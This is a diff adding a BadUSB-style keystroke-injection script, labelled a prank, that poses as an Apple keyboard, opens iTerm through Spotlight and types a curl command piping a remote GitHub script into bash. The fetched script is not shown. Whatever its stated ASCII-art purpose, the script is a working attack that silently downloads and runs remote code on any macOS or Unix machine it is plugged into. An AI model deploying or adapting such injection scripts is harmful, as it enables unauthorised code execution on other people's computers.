@@ -1,0 +1,26 @@
+ID 05ac:021e Apple:Keyboard
+REM Title: Ascii Art in Terminal
+REM Author: Moo
+REM Target:  Unix/Linux (requires  
+REM Version: 1.0
+REM Category: Prank
+REM Good old ascii art
+REM
+DELAY 1000
+REM Minimize all windows as that ensures launch happens smoother.
+DELAY 300
+F11
+DELAY 300
+REM Open spotlight
+GUI SPACE
+DELAY 1000
+REM
+STRING iTerm.app
+DELAY 200
+ENTER
+DELAY 4000
+REM
+STRING curl -s -L https://raw.githubusercontent.com/moolibdensplk/BadUSBexample/main/make_moo.sh | bash
+DELAY 300
+ENTER
+
